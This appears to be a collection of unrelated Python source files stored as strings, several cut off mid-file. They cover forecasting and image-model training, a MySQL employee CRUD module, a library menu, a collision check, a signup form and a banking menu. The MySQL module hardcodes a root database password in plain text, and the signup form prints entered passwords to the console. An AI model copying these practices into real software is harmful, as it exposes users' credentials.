    "from data_process import MQRNN_dataset, read_df\nimport torch\nimport matplotlib.pyplot as plt\n\nfrom config import CONFIG\n\n\ndef p_discriminator_train():\n    horizon_size = CONFIG['horizon_size']\n    quantiles = CONFIG['quantiles']\n    quantile_size = len(quantiles)\n    hidden_size = CONFIG['hidden_size']\n    columns = CONFIG['columns']\n    dropout = CONFIG['dropout']\n    layer_size = CONFIG['layer_size']\n    by_direction = CONFIG['by_direction']\n    lr = CONFIG['lr']\n    batch_size = CONFIG['batch_size']\n    num_epochs = CONFIG['num_epochs']\n    context_size = CONFIG['context_size']\n\n    # \u83b7\u53d6\u76ee\u6807\u53d8\u91cf\u7684\u8bad\u7ec3\u96c6\u3001\u6d4b\u8bd5\u96c6\u548c\u5916\u90e8\u53d8\u91cf\u7684\u8bad\u7ec3\u96c6\u3001\u6d4b\u8bd5\u96c6\n    train_target_df, test_target_df, train_covariate_df, test_covariate_df = read_df(CONFIG)\n\n    covariate_size = train_covariate_df.shape[1]\n\n    # \u83b7\u53d6\u786c\u4ef6\u9a71\u52a8\n    device = torch.device('cuda:0' if torch.cuda.is_available() else 'cpu')\n\n    # \u5b9a\u4e49\u6a21\u578b\n    mqrnn_model = MQRNN(horizon_size, hidden_size, quantiles, columns, dropout, layer_size, by_direction, lr, batch_size,\n                        num_epochs, context_size, covariate_size, device)\n\n    # \u5b9a\u4e49\u6570\u636e\u7c7b\u5b9e\u4f8b\n    train_dataset = MQRNN_dataset(train_target_df, train_covariate_df, horizon_size, quantile_size)\n\n    # \u6a21\u578b\u8bad\u7ec3\n    mqrnn_model.train(train_dataset)\n\n    predict_result = mqrnn_model.predict(train_target_df, train_covariate_df, test_covariate_df, columns)\n\n    # \u6a21\u578b\u9884\u6d4b\u7ed3\u679c\u53ef\u89c6\u5316\n\n    plt.rcParams.update({'figure.autolayout': True})\n    plt.figure(figsize=(15, 5), dpi=300)\n    plt.plot(predict_result[quantiles[0]], color='r', label='prediction')\n    plt.plot(test_target_df[0].to_list(), color='b', label='real')\n    plt.xticks([i for i in range(len(test_target_df))], [str(x) for x in test_target_df.index.values], rotation=-90)\n    plt.legend()\n    plt.show()\n\n\nif __name__ == \"__main__\":\n    p_discriminator_train()\n",
    "import mysql.connector\r\n\r\n# Establish connection to MySQL database\r\nmydb = mysql.connector.connect(\r\n    host=\"localhost\",\r\n    user=\"root\",\r\n    password=\"SALAH.BERRET.0\",\r\n    database=\"company_management\"\r\n)\r\n\r\n# Function to fetch all employee records from the database\r\ndef fetch_employee():\r\n    cur = mydb.cursor()\r\n    cur.execute(\"SELECT * FROM employee\")\r\n    rows = cur.fetchall()\r\n    cur.close()\r\n    return rows\r\n\r\n# Function to insert a new employee record into the database\r\ndef insert_employee(emp_id, first_name, last_name, birth_day, sex, salary, super_id, branch_id):\r\n    cur = mydb.cursor()\r\n    # Execute SQL INSERT statement\r\n    cur.execute(\"INSERT INTO employee VALUES (%s, %s, %s, %s, %s, %s, %s, %s)\", (emp_id, first_name, last_name, birth_day, sex, salary, super_id, branch_id))\r\n    # Commit the transaction\r\n    mydb.commit()\r\n    cur.close()\r\n\r\n# Function to delete an employee record from the database\r\ndef delete_employee(emp_id):\r\n    cur = mydb.cursor()\r\n    # Execute SQL DELETE statement\r\n    cur.execute(\"DELETE FROM employee WHERE emp_id=%s\", (emp_id,))\r\n    # Commit the transaction\r\n    mydb.commit()\r\n    cur.close()\r\n\r\n# Function to update an employee record in the database\r\ndef update_employee(new_fname, new_lname, new_birth_day, new_sex, new_salary, new_super_id, new_branch, emp_id):\r\n    cur = mydb.cursor()\r\n    # Execute SQL UPDATE statement\r\n    cur.execute(\"UPDATE employee SET first_name = %s, last_name = %s, birth_day = %s, sex = %s, salary = %s, super_id = %s, branch_id = %s WHERE emp_id = %s\", (new_fname, new_lname, new_birth_day, new_sex, new_salary, new_super_id, new_branch, emp_id))\r\n    # Commit the transaction\r\n    mydb.commit()\r\n    cur.close()\r\n\r\n# Function to check if an employee with the given ID exists in the database\r\ndef id_exists(emp_id):\r\n    cur = mydb.cursor()\r\n    # Execute SQL SELECT statement to count the number of rows with the given ID\r\n    cur.execute(\"SELECT COUNT(*) FROM employee WHERE emp_id = %s\", (emp_id,))\r\n    count = cur.fetchone()[0]\r\n    cur.close()\r\n    # Return True if count is greater than 0, indicating the ID exists; otherwise, return False\r\n    return count > 0\r\n",
    "from collections import Iterable\nimport statistics\n\nfrom src.common import safe_float\nfrom src.evaluator.exceptions.evaluation_error import EvaluationError\nfrom src.evaluator.reduce_operations.reduce_operation import ReduceOperation\n\n\nclass AverageOperation(ReduceOperation):\n    def __init__(self) -> None:\n        super().__init__(name=\"AVG\")\n\n    def calculate(self, table: Iterable[Iterable[str]]) -> str:\n        cells = []\n        for row in table:\n            for cell in row:\n                floated = safe_float(cell)\n                if isinstance(floated, float):\n                    cells.append(floated)\n        try:\n            return str(statistics.mean(cells))\n        except Exception as e:\n            raise EvaluationError(\"AVGFailed\") from e\n\n    @property\n    def documentation(self) -> str:\n        return \"\"\"\n        Average Function\n        @symbol: ABS \n        @parameters: Table of Numbers\n                     Ignore values which are not numbers\n        @returns: average of the entire table\n            sum(cells) / length(cells)\n        \"\"\"\n",
    "import logging\r\n\r\nimport numpy as np\r\nimport torch\r\nimport torchvision.transforms as T\r\nfrom PIL import Image\r\nfrom torchvision.datasets import CIFAR10, CIFAR100\r\n\r\nfrom src.datasets import GaussianBlur, GeneralDataset\r\nfrom tools.utils import color\r\n\r\nlogger = logging.getLogger(__name__)\r\n\r\n\r\ndef get_processor(task, config):\r\n    return globals().get(f\"{task}Processor\")(config=config)\r\n\r\n\r\nclass Processor:\r\n    def __init__(self, task):\r\n        self.task = task\r\n        self.multi_view = False\r\n        self.train_dataset = None\r\n        self.test_dataset = None\r\n\r\n    def get_dataset(self, **kwargs):\r\n        raise NotImplementedError\r\n\r\n    def get_transform(self, **kwargs):\r\n        return None, None\r\n\r\n    def get_data_split(self, indices, train_size, valid_size=0, **kwargs):\r\n        # note that indices is already shuffled\r\n        assert train_size > 0 and valid_size >= 0 and train_size + valid_size <= len(indices)\r\n        train_set = np.array(indices[:train_size])\r\n        valid_set = np.array(indices[train_size : train_size + valid_size])\r\n        logger.info(\r\n            color(\r\n                f\"{self.task}: train size: {len(train_set)}/{len(indices)}, valid size: {len(valid_set)}/{len(indices)}\",\r\n                \"blue\",\r\n            )\r\n        )\r\n        valid_set = None if len(valid_set) == 0 else valid_set\r\n        return train_set, valid_set\r\n\r\n\r\nclass CIFAR10Processor(Processor):\r\n    def __init__(self, config):\r\n        self.cfg = config\r\n        super().__init__(task=\"CIFAR10\")\r\n\r\n    def get_dataset(self, **kwargs):\r\n        train_ori = CIFAR10(r\"data/CIFAR10\", train=True, download=True)\r\n        test_ori = CIFAR10(r\"data/CIFAR10\", train=False, download=True)\r\n\r\n        CIFAR10_TRAIN_MEAN = (0.4914, 0.4822, 0.4465)\r\n        CIFAR10_TRAIN_STD = (0.2023, 0.1994, 0.2010)\r\n\r\n        test_transform = T.Compose([T.Normalize(CIFAR10_TRAIN_MEAN, CIFAR10_TRAIN_STD)])\r\n\r\n        if not getattr(self.cfg, \"use_aug\", False):\r\n            logger.info(color(\"using no online transform\", \"blue\"))\r\n            train_transform = None\r\n            test_transform = None\r\n        else:\r\n            logger.info(color(\"using online transform crop and flip\", \"blue\"))\r\n            train_transform = T.Compose(\r\n                [\r\n                    T.RandomCrop(32, padding=4),\r\n                    T.RandomHorizontalFlip(),\r\n                    T.Normalize(CIFAR10_TRAIN_MEAN, CIFAR10_TRAIN_STD),\r\n                ]\r\n            )\r\n\r\n        train_x = []\r\n        for i in range(len(train_ori.data)):\r\n            img = train_ori.data[i]\r\n            img = T.ToTensor()(Image.fromarray(img))\r\n            if train_transform is None:\r\n                img = T.Normalize(CIFAR10_TRAIN_MEAN, CIFAR10_TRAIN_STD)(img)\r\n            train_x.append(img)\r\n        train_x = torch.stack(train_x, dim=0)\r\n        test_x = []\r\n        for i in range(len(test_ori.data)):\r\n            img = test_ori.data[i]\r\n            img = T.ToTensor()(Image.fromarray(img))\r\n            if test_transform is None:\r\n                img = T.Normalize(CIFAR10_TRAIN_MEAN, CIFAR10_TRAIN_STD)(img)\r\n            test_x.append(img)\r\n        test_x = torch.stack(test_x, dim=0)\r\n\r\n        train_y, test_y = torch.tensor(train_ori.targets), torch.tensor(test_ori.targets)\r\n        logger.info(f\"CIFAR-10 contains {len(train_x)} train examples, {len(test_x)} test examples\")\r\n\r\n        train = GeneralDataset({\"img\": train_x, \"labels\": train_y}, transform=train_transform)\r\n        test = GeneralDataset({\"img\": test_x, \"labels\": test_y}, transform=test_transform)\r\n\r\n        return train, test\r\n\r\n    @staticmethod\r\n    def get_simclr_pipeline_transform(size, s=1, input_channels=3):\r\n        \"\"\"Return a set of data augmentation transformations as described in the SimCLR paper.\"\"\"\r\n        color_jitter = T.ColorJitter(0.8 * s, 0.8 * s, 0.8 * s, 0.2 * s)\r\n        data_transforms = T.Compose(\r\n            [\r\n                T.RandomResizedCrop(size=size),\r\n                T.RandomHorizontalFlip(),\r\n                T.RandomApply([color_jitter], p=0.8),\r\n                T.RandomGrayscale(p=0.2),\r\n                GaussianBlur(kernel_size=int(0.1 * size), input_channels=input_channels),\r\n            ]\r\n        )\r\n        # T.ToTensor()]) # offline process will do this\r\n        return data_transforms\r\n\r\n\r\nclass CIFAR100Processor(Processor):\r\n    def __init__(self, config):\r\n        self.cfg = config\r\n        super().__init__(task=\"CIFAR100\")\r\n\r\n    def get_dataset(self, **kwargs):\r\n        # mean and std of cifar100 dataset\r\n        CIFAR100_TRAIN_MEAN = (0.5070751592371323, 0.48654887331495095, 0.4409178433670343)\r\n        CIFAR100_TRAIN_STD = (0.2673342858792401, 0.2564384629170883, 0.27615047132568404)\r\n        test_transform = T.Compose([T.Normalize(CIFAR100_TRAIN_MEAN, CIFAR100_TRAIN_STD)])\r\n\r\n        if not getattr(self.cfg, \"use_aug\", False):\r\n            logger.info(color(\"using no online transform\", \"blue\"))\r\n            train_transform = None\r\n            test_transform",
    "#This file is for User Interface\r\n# -*- coding: utf-8 -*-\r\n\"\"\"\r\nCreated on Sat Mar 16 10:52:06 2024\r\n\r\n@author: inder\r\n\"\"\"\r\n#UserInterface \r\n\r\nfrom Database import LibraryDatabase\r\nimport sys\r\n\r\nclass CommandLineInterface:\r\n    \r\n    def __init__(self):\r\n        print(\"Welcome to Inderjit's library sytem version 1.0.\")\r\n        self.db = LibraryDatabase(\"library.db\")\r\n        self.mainMenu()\r\n        \r\n    def mainMenu(self):\r\n        print(\"What would you like to do?\")\r\n        print(\"\")\r\n        print(\"1:Checkout/Return Book  2:Manage Books  3:User Information  4:Close Program\")\r\n        try:\r\n            userInput = int(input())\r\n            if 0 < userInput < 5:\r\n                switcher = {\r\n                    1: self.checkingReturning,\r\n                    2: self.manageBooks,\r\n                    3: self.userInformation,\r\n                    4: self.termination\r\n                }\r\n                switcher.get(userInput)() \r\n            else:\r\n                print(\"This is not a vaild option try a number from 1-4.\")\r\n                self.mainMenu()\r\n        except ValueError:\r\n            print(\"This is not a vaild option try a number from 1-4.\")\r\n            self.mainMenu()\r\n         \r\n    #this will allow the user to checkout and return book        \r\n    def checkingReturning(self):\r\n        print(\"1:Checkout Book  2:Return Book  3:Return to Main Menu\")\r\n        try:\r\n            userInput = int(input())\r\n            if 0 < userInput < 4:\r\n                switcher = {\r\n                    1: self.db.checkout,\r\n                    2: self.db.returnBook,\r\n                    3: self.mainMenu\r\n                    }\r\n                switcher.get(userInput)()\r\n                self.mainMenu()\r\n            else:\r\n                print(\"This is not a valid option try a number from 1-3.\")\r\n                self.checkingReturning()\r\n        except ValueError:\r\n            print(\"This is not a valid option try a number from 1-3.\")\r\n            self.checkingReturning()\r\n        \r\n     \r\n    #this will allow the user to manage the books,    \r\n    def manageBooks(self):\r\n        print(\"1:Insert New Book  2:Find Book  3: Update Book Information  4:Delete Book  5: Return to main menu\")\r\n        try:\r\n            userInput = int(input())\r\n            if 0 < userInput < 6:\r\n                switcher = {\r\n                    1: self.db.insert,\r\n                    2: self.db.select,\r\n                    3: self.db.update,\r\n                    4: self.db.delete,\r\n                    5: self.mainMenu\r\n                    }\r\n                switcher.get(userInput)()\r\n                self.mainMenu()\r\n            else:\r\n                print(\"This is not a valid option try a number from 1-5.\")\r\n                self.manageBooks()\r\n        except ValueError:\r\n            print(\"This is not a valid option try a number from 1-5.\")\r\n            self.manageBooks()\r\n\r\n    #This will allow the user to manage the borrowers    \r\n    def userInformation(self):\r\n        print(\"1:Look Up User Information  2:Add New User  3: Delete User  4: Update User Information  5: Return to main menu\")\r\n        try:   \r\n            userInput = int(input())\r\n            if 0 < userInput < 6:\r\n                switcher = {\r\n                    1: self.db.findUserInformation,\r\n                    2: self.db.addUser,\r\n                    3: self.db.deleteUser, \r\n                    4: self.db.updateUser, \r\n                    5: self.mainMenu\r\n                    }\r\n                switcher.get(userInput)()\r\n                self.mainMenu()\r\n            else:\r\n                print(\"This is nor a valid option try a number from 1-5.\")\r\n                self.userInformation()\r\n        except ValueError:\r\n            print(\"This is nor a valid option try a number from 1-5.\")\r\n            self.userInformation()\r\n    \r\n    def termination(self):\r\n        self.db.close_connection()\r\n        print(\"The program has closed.\")\r\n        sys.exit()\r\n    \r\n    ",
    "import numpy as np\nimport matplotlib.pyplot as plt\nfrom mpl_toolkits.mplot3d import Axes3D\n\ndef collision_free(point1, point2, obstacle_list):\n    fig = plt.figure()\n    ax = fig.add_subplot(111, projection='3d')\n\n    # \u7ed8\u5236\u8fde\u7ebf\u6bb5\n    ax.plot([point1[0], point2[0]], [point1[1], point2[1]], [point1[2], point2[2]], color='b')\n\n    for obstacle in obstacle_list:\n        obstacle_center = np.array(obstacle[0])\n        obstacle_radius = obstacle[1]\n        # \u7ed8\u5236\u969c\u788d\u7269\u7403\u4f53\n        u = np.linspace(0, 2 * np.pi, 100)\n        v = np.linspace(0, np.pi, 100)\n        x = obstacle_center[0] + obstacle_radius * np.outer(np.cos(u), np.sin(v))\n        y = obstacle_center[1] + obstacle_radius * np.outer(np.sin(u), np.sin(v))\n        z = obstacle_center[2] + obstacle_radius * np.outer(np.ones(np.size(u)), np.cos(v))\n        ax.plot_surface(x, y, z, color='r', alpha=0.3)\n\n    ax.set_xlabel('X')\n    ax.set_ylabel('Y')\n    ax.set_zlabel('Z')\n\n    plt.show()\n    for obstacle in obstacle_list:\n        obstacle_center = np.array(obstacle[0])\n        obstacle_radius = obstacle[1]\n        print(obstacle_center)\n        distance = 0\n        link1 = point2 - point1\n        link2 = obstacle_center - point1\n        link3 = obstacle_center - point2\n        judge = np.dot(link1, link2) / np.dot(link1, link1)\n        if 0 <= judge <= 1:  # \u5782\u8db3\u5728\u7ebf\u6bb5\u4e0a\n            print(\"link1:\", link1)\n            print(\"link2:\", link2)\n            print(\"np.dot(link1, link2):\", np.dot(link1, link2))\n            print(\"np.dot(link1, link1):\", np.dot(link1, link1))\n            distance = np.linalg.norm(np.cross(link1, link2)) / np.linalg.norm(link1)\n            print(\"\u5782\u8db3\u5728\u7ebf\u6bb5\u4e0a\")\n            print(distance)\n        else:  # \u5782\u8db3\u4e0d\u5728\u7ebf\u6bb5\u4e0a\n            distance = min(np.linalg.norm(link2), np.linalg.norm(link3))\n            print(\"\u5782\u8db3\u4e0d\u5728\u7ebf\u6bb5\u4e0a\")\n            print(distance)\n        if distance < obstacle_radius:\n            return False\n    return True\n\n\n# \u6d4b\u8bd5\u793a\u4f8b\np1 = np.array([2.52377418, 3.1902712,  2.8873132])\np2 = np.array([1, 1, 1])\nobstacle_list = [([6, 6, 6], 1.5), ([9, 10, 9], 1.5), ([10, 6, 10], 1.5), ([8, 6, 8], 1), ([6, 10, 6], 1.5)]\nprint(collision_free(p1, p2, obstacle_list))\n",
    "import flet as ft\r\nfrom flet import Checkbox, Column, ElevatedButton, Row, Text, TextField\r\nfrom flet_core.control_event import ControlEvent\r\n\r\n\r\ndef main(page: ft.Page) -> None:\r\n    # Configura\u00e7\u00f5es da p\u00e1gina\r\n    page.title = 'Cadastro'\r\n    page.vertical_alignment = ft.MainAxisAlignment.CENTER\r\n    page.theme_mode = ft.ThemeMode.DARK\r\n    page.window_width = 400\r\n    page.window_height = 400\r\n    page.window_resizable = False\r\n\r\n    # Campos de Cadastro\r\n    text_username: TextField = TextField(label='Nome de Usu\u00e1rio', text_align=ft.TextAlign.LEFT, width=200)\r\n    text_password: TextField = TextField(label='Senha', text_align=ft.TextAlign.LEFT, width=200, password=True)\r\n    Checkbox_signup: Checkbox = Checkbox(label='Aceitar Termos', value= False)\r\n    button_submit: ElevatedButton = ElevatedButton(text='Cadastrar', width=200, disabled=True)\r\n\r\n    # Fun\u00e7\u00e3o para validar preenchimento dos campos\r\n    def validate(e: ControlEvent) -> None: \r\n        \"\"\"Valida se todos os campos foram preenchidos corretamente.\"\"\"\r\n        if all([text_username.value, text_password.value, Checkbox_signup.value]):\r\n            button_submit.disabled = False\r\n        else: \r\n            button_submit.disabled = True \r\n        page.update()\r\n\r\n    # Fun\u00e7\u00e3o para submeter cadastro\r\n    def submit(e: ControlEvent) -> None:\r\n        \"\"\"Submete o cadastro e exibe mensagem de boas-vindas.\"\"\"\r\n        print('Nome de Usu\u00e1rio:', text_username.value)\r\n        print('Senha:', text_password.value)\r\n\r\n        page.clean()\r\n        page.add(\r\n            Row(\r\n                controls=[Text(value=f'Bem-vindo: {text_username.value}', size=20)],\r\n                alignment=ft.MainAxisAlignment.CENTER\r\n            )\r\n        )\r\n\r\n    # Atribui\u00e7\u00e3o de eventos \u00e0s fun\u00e7\u00f5es de valida\u00e7\u00e3o\r\n    Checkbox_signup.on_change = validate\r\n    text_username.on_change = validate\r\n    text_password.on_change = validate\r\n    button_submit.on_click = submit \r\n\r\n    # Adiciona os controles \u00e0 p\u00e1gina\r\n    page.add(\r\n        Row(\r\n            controls=[\r\n                Column(\r\n                    [text_username,\r\n                    text_password,\r\n                    Checkbox_signup,\r\n                    button_submit]\r\n                )\r\n            ],\r\n            alignment=ft.MainAxisAlignment.CENTER\r\n        )\r\n    )\r\n\r\nif __name__ == '__main__':\r\n    # Inicia a aplica\u00e7\u00e3o\r\n    ft.app(target=main)\r\n",
    "import time\nimport math\nimport torch\nimport torch.nn as nn\nimport pandas as pd\nimport numpy as np\nfrom utils import *\nfrom torch import optim\nfrom torch.autograd import Variable\n\nclass Template(nn.Module):\n    def __init__(self, cfg):\n        super().__init__()\n        self.device = torch.device( cfg['cuda'] if torch.cuda.is_available() else 'cpu')\n        self.verbose = cfg['verbose']\n        self.epochs = cfg['epochs']\n        self.seed = cfg['seed']\n        self.optimizer_name = cfg['optimizer_name']\n        self.optimizer_kwargs = cfg['optimizer_kwargs']\n        self.checkpoint = cfg['model_checkpoint_path']\n        self.batch = cfg['batch']\n\n    # ----- Abstract class methods ----- #\n    def forward(self, X):\n        raise NotImplementedError()\n\n    def get_data_dict_from_dataloader(self, data, phase):\n        raise NotImplementedError()\n    \n    def loss(self, output, data_dict):\n        raise NotImplementedError()\n    \n    def analyse_predictions(self, y_true, y_pred, info={}):\n        raise NotImplementedError()\n    \n    # ----- Standard deep learning step ----- #\n    def train_or_eval_dataset(self, dataloaders, dataset_sizes, phase):\n        assert phase in ['train', 'test'], print('Wrong phase!')\n        if phase == 'train':\n            self.train(True)\n        else:\n            self.train(False)\n        \n        running_loss = 0.0\n        n_batches_loaded = 0\n        loss_details = []\n        concatenated_labels = {}\n        concatenated_outputs = {}\n\n        # get the inputs\n        for data in dataloaders[phase]:\n            n_batches_loaded += 1\n            data_dict = self.get_data_dict_from_dataloader(data)\n            inputs = data_dict['inputs']\n            labels = data_dict['labels']\n            \n            # Zero the parameter gradients\n            self.optimizer.zero_grad()\n\n            # Forward\n            outputs = self.forward(inputs)\n\n            # compute loss\n            loss, loss_detail = self.loss(outputs, data_dict)\n            loss_details.append(loss_detail)\n\n            # record labels and outputs\n            concatenated_labels = extend_dicts(concatenated_labels, labels)\n            concatenated_outputs = extend_dicts(concatenated_outputs, outputs)\n\n            # backward and optimize\n            if phase == 'train':\n                loss.backward()\n                self.optimizer.step()\n            \n            # loss statistics\n            running_loss += loss.data.item() * labels[list(labels.keys())[0]].size(0) # Mean batch loss -> batches loss\n        \n        epoch_loss = running_loss / dataset_sizes[phase] # sum batches loss -> Mean epoch loss\n        info = {\n            'phase': phase,\n            'dataset_size': dataset_sizes[phase],\n            'epoch_loss': epoch_loss,\n            'loss_details': loss_details\n        }\n        metrics_for_epoch = self.analyse_predictions(concatenated_labels, concatenated_outputs, info)\n        if self.verbose['metrics']:\n            print(metrics_for_epoch)\n        \n        return metrics_for_epoch\n\n    \n    def fit(self, dataloaders, dataset_sizes):\n        since = time.time()\n        all_metrics = {}\n\n\n        for epoch in range(self.epochs):\n            epoch_t0 = time.time()\n            print('\\nEpoch {}/{}'.format(epoch, self.epochs - 1))\n            print('-' * 60)\n            metrics_for_epoch = {}\n\n            # train one epoch\n            metrics_for_phase = self.train_or_eval_dataset(dataloaders, dataset_sizes, 'train')\n            metrics_for_epoch.update(metrics_for_phase)\n\n\n            all_metrics[epoch] = metrics_for_epoch\n            print('Total second taken for epoch: %2.3fs' % (time.time() - epoch_t0))\n        \n            if self.verbose['layer_magnitudes']:\n                print('\\n\\n Printing layer magnitudes')\n                self.print_layer_magnitudes(epoch)\n\n        torch.save(self.state_dict(), self.checkpoint)    \n        all_metrics['final_results'] = metrics_for_epoch\n        time_elapse = time.time() - since\n        all_metrics['total_seconds_to_train'] = time_elapse\n        print(\"Training complete in {:.0f}m, {:.0f}s\".format(time_elapse // 60, time_elapse % 60))\n\n        self.load_state_dict(torch.load(self.checkpoint))\n        self.train(False)\n        print('The test set metrics: ')\n        test_metrics = self.train_or_eval_dataset(dataloaders, dataset_sizes, 'test')\n        return test_metrics\n\n        \n    def setup_optimizers(self, optimizer_name, optimizer_kwargs):\n        if optimizer_name == 'sgd':\n            self.optimizer = optim.SGD(\n                filter(lambda p: p.requires_grad, self.parameters()), **optimizer_kwargs\n            )\n        elif optimizer_name == 'adam':\n            self.optimizer = optim.Adam(\n                filter(lambda p: p.requires_grad, self.parameters()), **optimizer_kwargs\n            )\n        else:\n            raise Exception('Not a valid optimizer')\n        \n\n    def print_layer_magnitudes(self, epoch):\n        '''\n        check whether each layer's L2 n",
    "import os\nimport numpy as np\nfrom PIL import Image, ImageOps\nimport matplotlib.pyplot as plt\nfrom keras.models import load_model\n\n\ndef load_test_case(path):\n    image = Image.open(path)\n\n    # \u041a\u043e\u043d\u0432\u0435\u0440\u0442\u0430\u0446\u0438\u044f \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f \u0432 \u043e\u0442\u0442\u0435\u043d\u043a\u0438 \u0441\u0435\u0440\u043e\u0433\u043e, \u0440\u0435\u0441\u0430\u0439\u0437\u0438\u043d\u0433 \u0441 \u043f\u043e\u043c\u043e\u0449\u044c\u044e LANCZOS\n    image = image.convert('L')\n    image = image.resize((28, 28), Image.Resampling.LANCZOS)\n\n    # \u0418\u043d\u0432\u0435\u0440\u0442\u0430\u0446\u0438\u044f \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f\n    image = ImageOps.invert(image)\n    image_array = np.array(image)\n    image_array = image_array / 255.0\n\n    # \u0414\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u043a\u0430\u043d\u0430\u043b \u0438\u0437\u043c\u0435\u0440\u0435\u043d\u0438\u044f\n    image_array = np.expand_dims(image_array, axis=-1)\n    image_array = np.expand_dims(image_array, axis=0)\n\n    # \u041c\u0435\u0442\u043a\u0430 \u0442\u0435\u0441\u0442\u0430 - \u0438\u043c\u044f \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f \u0431\u0435\u0437 \u0440\u0430\u0441\u0448\u0438\u0440\u0435\u043d\u0438\u044f\n    filename = os.path.splitext(os.path.basename(path))[0]\n    test_label = np.array([int(filename)])\n\n    return (image_array, test_label)\n\n\ntest_images = []\ntest_labels = []\n\n# \u0417\u0430\u0433\u0440\u0443\u0436\u0430\u0435\u043c 10 \u0442\u0435\u0441\u0442\u043e\u0432\u044b\u0445 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0439 (\u0446\u0438\u0444\u0440\u044b \u043e\u0442 0 \u0434\u043e 9)\nfor i in range(10):\n    image_path = f'./test/{i}.png'\n    image_array, test_label = load_test_case(image_path)\n    test_images.append(image_array)\n    test_labels.append(test_label)\n\n# \u041a\u043e\u043d\u0432\u0435\u0440\u0442\u0438\u0440\u0443\u0435\u043c \u0441\u043f\u0438\u0441\u043e\u043a \u0432 numpy \u043c\u0430\u0441\u0441\u0438\u0432\ntest_images = np.vstack(test_images)  # \u0412\u044b\u043f\u043e\u043b\u043d\u044f\u0435\u043c \u0432\u0435\u0440\u0442\u0438\u043a\u0430\u043b\u044c\u043d\u0443\u044e \u043a\u043e\u043d\u043a\u0430\u0442\u0435\u043d\u0430\u0446\u0438\u044e\ntest_labels = np.concatenate(test_labels)  # \u0412\u044b\u043f\u043e\u043b\u043d\u044f\u0435\u043c \u0433\u043e\u0440\u0438\u0437\u043e\u043d\u0442\u0430\u043b\u044c\u043d\u0443\u044e \u043a\u043e\u043d\u043a\u0430\u0442\u0435\u043d\u0430\u0446\u0438\u044e\n\n# \u0417\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u043c\u043e\u0434\u0435\u043b\u0438\nmodel_path = 'mnist_cnn_model.keras'\nmodel = load_model(model_path)\n\n# \u041e\u0446\u0435\u043d\u043a\u0430 \u043c\u043e\u0434\u0435\u043b\u0438 \u043f\u043e \u0442\u0435\u0441\u0442\u043e\u0432\u044b\u043c \u0434\u0430\u043d\u043d\u044b\u043c\ntest_loss, test_acc = model.evaluate(test_images, test_labels, verbose=2)\nprint(f\"Test loss: {test_loss}\")\nprint(f\"Test accuracy: {test_acc}\")\n\n# \u0412\u044b\u0431\u043e\u0440 \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u043e\u0433\u043e \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f\nindex = np.random.randint(0, len(test_images))\nselected_image = test_images[index:index+1]\nselected_label = test_labels[index]\n\n# \u041f\u0440\u0435\u0434\u0441\u043a\u0430\u0437\u0430\u043d\u0438\u0435 \u043a\u043b\u0430\u0441\u0441\u0430 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f\npredicted = model.predict(selected_image)\npredicted_class = np.argmax(predicted, axis=-1)\n\nstring_result = \\\n    f\"Predicted class: {predicted_class[0]}\\n\" +\\\n    f\"True Label: {selected_label}\"\nprint(string_result)\n\n# \u0412\u0438\u0437\u0443\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u0432\u044b\u0431\u0440\u0430\u043d\u043d\u043e\u0433\u043e \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f\nplt.imshow(selected_image.squeeze(), cmap=plt.cm.binary)\nplt.title(string_result)\nplt.show()\n",
    "# Defini\u00e7\u00e3o do menu de op\u00e7\u00f5es\r\nmenu = '''\r\n[d] Depositar\r\n[s] Sacar\r\n[e] Extrato\r\n[q] Sair\r\n\r\n=>: '''\r\n\r\n# Inicializa\u00e7\u00e3o das vari\u00e1veis de conta\r\nsaldo = 0\r\nlimite = 500\r\nextrato = \"\"  # Inicializa uma string vazia para armazenar as transa\u00e7\u00f5es do extrato\r\nnumero_sques = 0\r\nLIMITE_SQUES = 3  # Define o limite de saques di\u00e1rios\r\n\r\n# Loop principal do programa\r\nwhile True:\r\n    # Solicita\u00e7\u00e3o da op\u00e7\u00e3o ao usu\u00e1rio\r\n    opcao = input(menu)\r\n\r\n    # Op\u00e7\u00e3o de dep\u00f3sito\r\n    if opcao == \"d\":\r\n        # Solicita o valor do dep\u00f3sito ao usu\u00e1rio\r\n        valor_deposito = float(input(\"Por favor, digite o valor a ser depositado: \"))\r\n\r\n        # Verifica se o valor \u00e9 v\u00e1lido\r\n        if valor_deposito > 0:\r\n            # Atualiza o saldo, adiciona a transa\u00e7\u00e3o ao extrato e exibe o saldo atualizado\r\n            saldo += valor_deposito\r\n            extrato += f\"Dep\u00f3sito de R${valor_deposito:.2f}\\n\"\r\n            print(f\"Seu saldo atualizado \u00e9 de: R${saldo:.2f}\")\r\n        else:\r\n            print(\"Valor inv\u00e1lido, refa\u00e7a a a\u00e7\u00e3o novamente.\")\r\n\r\n    # Op\u00e7\u00e3o de saque\r\n    elif opcao == \"s\":\r\n        if numero_sques < LIMITE_SQUES:\r\n            # Verifica se o limite de saques di\u00e1rios ainda n\u00e3o foi atingido\r\n            print(\"Saque\")\r\n            # Solicita o valor do saque ao usu\u00e1rio\r\n            valor_saque = float(input(\"Digite o valor do saque: \"))\r\n\r\n            # Verifica se o valor de saque \u00e9 v\u00e1lido em rela\u00e7\u00e3o ao limite e saldo dispon\u00edvel\r\n            if valor_saque > limite:\r\n                print(f\"O valor do saque \u00e9 maior que o limite atual de R${limite:.2f}, por favor, insira um valor menor ou igual a R${limite:.2f}.\")\r\n            elif valor_saque > 0:\r\n                if saldo - valor_saque >= 0:\r\n                    # Atualiza o saldo, n\u00famero de saques e limite de saque, adiciona a transa\u00e7\u00e3o ao extrato e exibe mensagem de sucesso\r\n                    saldo -= valor_saque\r\n                    numero_sques += 1\r\n                    limite -= valor_saque\r\n                    extrato += f\"Saque de R${valor_saque:.2f}\\n\"\r\n                    print(f\"Seu saque de R${valor_saque:.2f} foi realizado com sucesso! Seu saldo atual \u00e9: R${saldo:.2f}, seu n\u00famero de 